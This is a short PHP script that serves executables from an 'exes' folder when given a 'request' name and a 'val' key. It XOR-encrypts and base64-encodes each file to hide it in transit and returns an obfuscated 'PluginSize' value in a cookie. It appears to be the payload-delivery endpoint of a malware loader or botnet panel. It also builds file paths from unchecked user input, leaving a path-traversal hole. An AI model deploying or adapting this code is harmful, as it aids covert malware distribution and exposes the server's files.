<?php

//CONFIG//////////
$DirName = "exes";
//END CONFIG/////////////

function _xor($src,$value) {
for($i=0;$i<strlen($src);$i++) {
for($x=0;$x<strlen($value);$x++) {
$src{$i} = $src{$i} ^ $value{$x};
}
}
return $src;
}

function DecodeDecrypt($src,$key) {
$encodedData = str_replace(' ','+',$src);
$src = base64_decode($encodedData);
$dest = _xor($src,$key);

return $dest;
}


if(!empty($_GET["request"]) && !empty($_GET["val"])) { //request - download executable

$Key = $_GET["val"];

$filename = $DirName . "\\" . $_GET["request"];
$filename .= ".exe"; //EXTENSION OF THE FILE

if(file_exists($filename)) {
$fh = fopen($filename,"rb");

if($fh!=NULL) { 
$f_content = '';
$content = '';
$PluginSize = 0;
while(!feof($fh)) {
  $f_content = fread($fh, 8192);
  $content .= $f_content; //concentrate content
}
fclose($fh);

$content = _xor($content,$Key);
$content = base64_encode($content);
$PluginSize = strlen($content) + 1024;


$localdownload = "(" . $PluginSize . ")" ;
$localdownload = "$" . $localdownload;
$localdownload = _xor($localdownload,$Key);

$localdownload = base64_encode($localdownload);
setcookie("response",$localdownload);
echo $content;

} //$fh!=NULL
} //file_Exists

} //$request and $val not empty

?>